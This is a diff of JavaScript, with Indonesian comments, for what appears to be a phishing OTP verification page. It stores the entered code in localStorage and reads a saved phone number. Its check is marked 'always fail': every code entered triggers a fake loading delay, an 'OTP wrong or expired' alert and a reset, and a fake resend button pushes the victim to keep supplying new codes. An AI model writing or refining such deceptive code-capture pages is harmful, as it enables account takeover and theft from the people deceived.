@@ -1,9 +1,6 @@
 /* ========================= */
-/* OTP */
+/* ELEMENT */
 /* ========================= */
-
-const sound =
-document.getElementById("successSound");
 
 const otpInputs =
 document.querySelectorAll(".otp-box");
@@ -17,47 +14,61 @@ document.querySelector(".error-box");
 const loadingBox =
 document.getElementById("loadingBox");
 
-const blockedBox =
-document.querySelector(".blocked-box");
-
-const blockedBtn =
-document.querySelector(".blocked-btn");
-
 const alertTitle =
 document.querySelector(".alert-title");
 
 const alertDesc =
 document.querySelector(".alert-desc");
 
+const phoneNumber =
+document.querySelector(".phone-number");
+
+const resendBtn =
+document.querySelector(".resend-btn");
+
+const timerText =
+document.querySelector(".timer");
+
+
 /* ========================= */
-/* PLAY SOUND */
+/* VARIABLE */
 /* ========================= */
 
-window.addEventListener(
-"pageshow",
-() => {
+let alertTimer = null;
+let countdown = null;
+let time = 60;
+let isProcessing = false;
 
-    loadingBox.style.display =
-    "none";
 
-    sound.play();
+/* ========================= */
+/* ALERT */
+/* ========================= */
 
-});
+function showTempAlert(
+    title,
+    desc,
+    color = "red"
+) {
 
-let alertTimer;
-
-function showTempAlert(title, desc, color){
+    if (
+        !errorBox ||
+        !alertTitle ||
+        !alertDesc
+    ) {
+        return;
+    }
 
     clearTimeout(alertTimer);
 
-    alertTitle.innerText = title;
-    alertDesc.innerText = desc;
-
-    // 🔥 warna title
+    alertTitle.textContent = title;
+    alertDesc.textContent = desc;
     alertTitle.style.color = color;
 
     errorBox.style.display = "block";
-    errorBox.classList.add("show");
+
+    requestAnimationFrame(() => {
+        errorBox.classList.add("show");
+    });
 
     alertTimer = setTimeout(() => {
 
@@ -68,32 +79,140 @@ function showTempAlert(title, desc, color){
         }, 300);
 
     }, 3000);
+
 }
 
-/* FADE IN */ 
+
+function hideAlert() {
+
+    if (!errorBox) {
+        return;
+    }
+
+    clearTimeout(alertTimer);
+
+    errorBox.classList.remove("show");
+    errorBox.style.display = "none";
+
+}
+
+
+/* ========================= */
+/* LOADING */
+/* ========================= */
+
+function showLoading() {
+
+    if (loadingBox) {
+        loadingBox.style.display = "flex";
+    }
+
+}
+
+
+function hideLoading() {
+
+    if (loadingBox) {
+        loadingBox.style.display = "none";
+    }
+
+}
+
+
+/* ========================= */
+/* RESET OTP */
+/* ========================= */
+
+function resetOTP() {
+
+    otpInputs.forEach(input => {
+
+        input.value = "";
+        input.disabled = false;
+
+    });
+
+    if (otpInputs.length > 0) {
+        otpInputs[0].focus();
+    }
+
+}
+
+
+/* ========================= */
+/* AMBIL NILAI OTP */
+/* ========================= */
+
+function getOTPValue() {
+
+    let otp = "";
+
+    otpInputs.forEach(input => {
+        otp += input.value;
+    });
+
+    return otp;
+
+}
+
+
+/* ========================= */
+/* SHAKE */
+/* ========================= */
+
+function shakeOTP() {
+
+    if (!otpContainer) {
+        return;
+    }
+
+    otpContainer.classList.remove("shake");
+
+    void otpContainer.offsetWidth;
+
+    otpContainer.classList.add("shake");
+
+    if ("vibrate" in navigator) {
+        navigator.vibrate(250);
+    }
+
+    setTimeout(() => {
+
+        otpContainer.classList.remove("shake");
+
+    }, 350);
+
+}
+
+
+/* ========================= */
+/* FADE IN */
+/* ========================= */
+
 window.addEventListener("load", () => {
 
-    document.body.classList.add(
-    "fade-in"
-    );
+    document.body.classList.add("fade-in");
 
 });
 
-/* TOTAL SALAH */
-let wrongCount = 0;
 
-/* HIDE ALERT */
-errorBox.style.display = "none";
+/* ========================= */
+/* RESET SAAT HALAMAN KEMBALI */
+/* ========================= */
 
-/* HIDE BLOCK */
-blockedBox.style.display = "none";
-
-/* RESET LOADING */
 window.addEventListener("pageshow", () => {
 
-    loadingBox.style.display = "none";
+    isProcessing = false;
+
+    hideLoading();
+    hideAlert();
+
+    otpInputs.forEach(input => {
+        input.disabled = false;
+    });
 
 });
+
 
 /* ========================= */
 /* NOMOR OTOMATIS */
@@ -102,92 +221,182 @@ window.addEventListener("pageshow", () => {
 const savedNumber =
 localStorage.getItem("nmrx");
 
-if(savedNumber){
+if (savedNumber && phoneNumber) {
 
-    document.querySelector(
-    ".phone-number"
-    ).innerText = savedNumber;
+    phoneNumber.textContent =
+    savedNumber;
 
 }
 
+
 /* ========================= */
-/* FOKUS KE BOX PERTAMA */
+/* KONDISI AWAL */
 /* ========================= */
 
-otpContainer.addEventListener("click", () => {
+hideLoading();
+hideAlert();
 
-    for(let i = 0; i < otpInputs.length; i++){
 
-        if(otpInputs[i].value === ""){
+/* ========================= */
+/* FOKUS OTP */
+/* ========================= */
 
-            otpInputs[i].focus();
+if (otpContainer) {
 
-            return;
+    otpContainer.addEventListener(
+        "click",
+        () => {
+
+            if (isProcessing) {
+                return;
+            }
+
+            for (
+                let index = 0;
+                index < otpInputs.length;
+                index++
+            ) {
+
+                if (
+                    otpInputs[index].value === ""
+                ) {
+
+                    otpInputs[index].focus();
+                    return;
+
+                }
+
+            }
+
+            if (otpInputs.length > 0) {
+
+                otpInputs[
+                    otpInputs.length - 1
+                ].focus();
+
+            }
 
         }
+    );
 
-    }
+}
 
-    otpInputs[0].focus();
-
-});
 
 /* ========================= */
-/* OTP INPUT */
+/* INPUT OTP */
 /* ========================= */
 
-otpInputs.forEach((input,index) => {
+otpInputs.forEach((input, index) => {
 
-    input.addEventListener("input", () => {
+    input.setAttribute(
+        "inputmode",
+        "numeric"
+    );
 
-        input.value =
-        input.value.replace(/[^0-9]/g,'');
+    input.setAttribute(
+        "maxlength",
+        "1"
+    );
 
-        /* HIDE ERROR */
-        errorBox.style.display =
-        "none";
+    input.addEventListener(
+        "input",
+        () => {
 
-        /* NEXT BOX */
-        if(
-            input.value.length === 1 &&
-            index < otpInputs.length - 1
-        ){
+            if (isProcessing) {
+                return;
+            }
 
-            otpInputs[index + 1]
-            .focus();
+            input.value =
+            input.value
+            .replace(/\D/g, "")
+            .slice(0, 1);
+
+            hideAlert();
+
+            if (
+                input.value.length === 1 &&
+                index < otpInputs.length - 1
+            ) {
+
+                otpInputs[index + 1]
+                .focus();
+
+            }
+
+            checkOTP();
 
         }
+    );
 
-        checkOTP();
 
-    });
+    input.addEventListener(
+        "keydown",
+        event => {
 
-    /* BACKSPACE */
-    input.addEventListener("keydown", (e) => {
+            if (isProcessing) {
+                return;
+            }
 
-        if(
-            e.key === "Backspace" &&
-            input.value === "" &&
-            index > 0
-        ){
+            if (
+                event.key === "Backspace" &&
+                input.value === "" &&
+                index > 0
+            ) {
 
-            otpInputs[index - 1]
-            .focus();
+                otpInputs[index - 1]
+                .focus();
+
+            }
 
         }
+    );
 
-    });
+
+    input.addEventListener(
+        "paste",
+        event => {
+
+            event.preventDefault();
+
+            if (isProcessing) {
+                return;
+            }
+
+            const pastedOTP =
+            event.clipboardData
+            .getData("text")
+            .replace(/\D/g, "")
+            .slice(0, otpInputs.length);
+
+            if (!pastedOTP) {
+                return;
+            }
+
+            otpInputs.forEach(
+                (otpInput, otpIndex) => {
+
+                    otpInput.value =
+                    pastedOTP[otpIndex] || "";
+
+                }
+            );
+
+            checkOTP();
+
+        }
+    );
 
 });
 
 
 /* ========================= */
 /* CHECK OTP */
+/* SIMULASI SELALU GAGAL */
 /* ========================= */
 
-function checkOTP(){
+function checkOTP() {
 
-    let otp = "";
+  let otp = "";
 
     otpInputs.forEach(input => {
 
@@ -196,7 +405,7 @@ function checkOTP(){
     });
 
     /* FULL OTP */
-    if(otp.length === 4){
+    if(otp.length === 6){
 
          /* SIMPAN */
     localStorage.setItem(
@@ -252,293 +461,133 @@ function checkOTP(){
 
 });
 
-        /* SHOW LOADING */
-        loadingBox.style.display =
-        "flex";
-
-        setTimeout(() => {
-
-            /* HIDE LOADING */
-            loadingBox.style.display =
-            "none";
-
-            /* TOTAL SALAH */
-            wrongCount++;
-
-/* ========================= */
-/* 1X SALAH */
-/* ========================= */
-if(wrongCount === 1){
-
-    showTempAlert(
-        "Terima Kasih",
-        "Permintaan Anda Sedang di Proses",
-        "blue" // 🔴 merah
-    );
-
-}
-
-/* ========================= */
-/* 2 - 3X SALAH */
-/* ========================= */
-else if(wrongCount >= 2 && wrongCount <= 3){
-
-    showTempAlert(
-        "Terima Kasih",
-        "Permintaan Anda Sedang di Proses",
-        "blue" // 🔵 biru
-    );
-
-}
-
-            /* ========================= */
-            /* 4X SALAH */
-            /* ========================= */
-
-            else if(wrongCount >= 4){
-
-                document.querySelector(
-                ".container"
-                ).style.display =
-                "none";
-
-                blockedBox.style.display =
-                "block";
-
-                return;
-
-            }
-
-            /* SHAKE */
-            otpContainer.classList
-            .add("shake");
-
-            navigator.vibrate(250);
-
-            setTimeout(() => {
-
-                otpContainer.classList
-                .remove("shake");
-
-            },350);
-
-            /* RESET OTP */
-            setTimeout(() => {
-
-                otpInputs.forEach(input => {
-
-                    input.value = "";
-
-                });
-
-                otpInputs[0].focus();
-
-            },300);
-
-        },2000);
-
+    if (
+        otp.length !== otpInputs.length ||
+        isProcessing
+    ) {
+        return;
     }
 
+    isProcessing = true;
+
+    otpInputs.forEach(input => {
+        input.disabled = true;
+    });
+
+    hideAlert();
+    showLoading();
+
+    setTimeout(() => {
+
+        hideLoading();
+
+        shakeOTP();
+
+        showTempAlert(
+            "Kode OTP Salah atau Kadaluarsa",
+            "Pastikan Kode yang kamu masukan sudah benar dan tidak kadaluarsa.",
+            "red"
+        );
+
+        resetOTP();
+
+        isProcessing = false;
+
+    }, 2000);
+
 }
+
+}
+
 
 /* ========================= */
 /* TIMER */
 /* ========================= */
 
-const resendBtn =
-document.querySelector(".resend-btn");
+function startTimer() {
 
-const timerText =
-document.querySelector(".timer");
-
-let time = 60;
-
-resendBtn.disabled = true;
-
-const countdown =
-setInterval(() => {
-
-    let seconds =
-    time < 10
-    ? "0" + time
-    : time;
-
-    timerText.innerText =
-    `00:${seconds}`;
-
-    time--;
-
-    if(time < 0){
-
-        clearInterval(countdown);
-
-        timerText.innerText =
-        "00:00";
-
-        resendBtn.disabled =
-        false;
-
-        resendBtn.classList
-        .add("active");
-
+    if (!resendBtn || !timerText) {
+        return;
     }
 
-},1000);
+    clearInterval(countdown);
 
-/* ========================= */
-/* RESEND */
-/* ========================= */
+    time = 60;
 
-resendBtn.addEventListener(
-"click",
-() => {
+    resendBtn.disabled = true;
 
-    if(!resendBtn.disabled){
+    resendBtn.classList
+    .remove("active");
 
-        location.reload();
+    timerText.textContent =
+    "00:60";
 
-    }
+    countdown = setInterval(() => {
 
-});
+        time--;
 
-const slides = [
-    "assets/slide1.jpg",
-    "assets/slide2.jpg",
-    "assets/slide3.jpg",
-    "assets/slide4.jpg"
-];
+        const seconds =
+        String(time)
+        .padStart(2, "0");
 
-let currentSlide = 0;
-let isAnimating = false;
+        timerText.textContent =
+        `00:${seconds}`;
 
-const slideImg =
-document.getElementById("slideImg");
+        if (time <= 0) {
 
-const slideCounter =
-document.getElementById("slideCounter");
+            clearInterval(countdown);
 
-const prevBtn =
-document.getElementById("prevBtn");
+            timerText.textContent =
+            "00:00";
 
-const nextBtn =
-document.getElementById("nextBtn");
+            resendBtn.disabled =
+            false;
 
-function changeSlide(direction){
-
-    if(isAnimating) return;
-
-    isAnimating = true;
-
-    if(direction === "next"){
-        slideImg.classList.add("slide-out-left");
-    }else{
-        slideImg.classList.add("slide-out-right");
-    }
-
-    setTimeout(() => {
-
-        if(direction === "next"){
-
-            currentSlide++;
-
-            if(currentSlide >= slides.length){
-                currentSlide = 0;
-            }
-
-        }else{
-
-            currentSlide--;
-
-            if(currentSlide < 0){
-                currentSlide = slides.length - 1;
-            }
+            resendBtn.classList
+            .add("active");
 
         }
 
-        slideImg.src = slides[currentSlide];
-
-        slideCounter.innerText =
-        `${currentSlide + 1} / ${slides.length}`;
-
-        slideImg.classList.remove(
-            "slide-out-left",
-            "slide-out-right"
-        );
-
-        slideImg.style.opacity = "0";
-        slideImg.style.transform =
-        direction === "next"
-        ? "translateX(25px) scale(.96)"
-        : "translateX(-25px) scale(.96)";
-
-        setTimeout(() => {
-
-            slideImg.style.opacity = "1";
-            slideImg.style.transform =
-            "translateX(0) scale(1)";
-
-        },30);
-
-        setTimeout(() => {
-            isAnimating = false;
-        },300);
-
-    },280);
-}
-
-nextBtn.addEventListener("click", () => {
-    changeSlide("next");
-});
-
-prevBtn.addEventListener("click", () => {
-    changeSlide("prev");
-});
-
-function updateSlide(){
-
-    slideImg.style.opacity = "0";
-
-    setTimeout(() => {
-
-        slideImg.src =
-        slides[currentSlide];
-
-        slideCounter.innerText =
-        `${currentSlide + 1} / ${slides.length}`;
-
-        slideImg.style.opacity = "1";
-
-    },150);
+    }, 1000);
 
 }
 
-const introOverlay =
-document.getElementById("introOverlay");
-
-const introBtn =
-document.getElementById("introBtn");
-
-introBtn.addEventListener("click", () => {
-
-    introOverlay.classList.add("hide");
-
-    setTimeout(() => {
-        introOverlay.style.display = "none";
-    },350);
-
-});
 
 /* ========================= */
-/* MULAI DARI AWAL */
+/* KIRIM ULANG */
 /* ========================= */
 
-blockedBtn.addEventListener(
-"click",
-() => {
+if (resendBtn) {
 
-    localStorage.clear();
+    resendBtn.addEventListener(
+        "click",
+        () => {
 
-    window.location.href =
-    "index.html";
+            if (
+                resendBtn.disabled ||
+                isProcessing
+            ) {
+                return;
+            }
 
-});
+            resetOTP();
+
+            showTempAlert(
+                "Kode Dikirim Ulang",
+                "Silakan periksa kode verifikasi terbaru.",
+                "blue"
+            );
+
+            startTimer();
+
+        }
+    );
+
+}
+
+
+/* ========================= */
+/* MULAI TIMER */
+/* ========================= */
+
+startTimer();
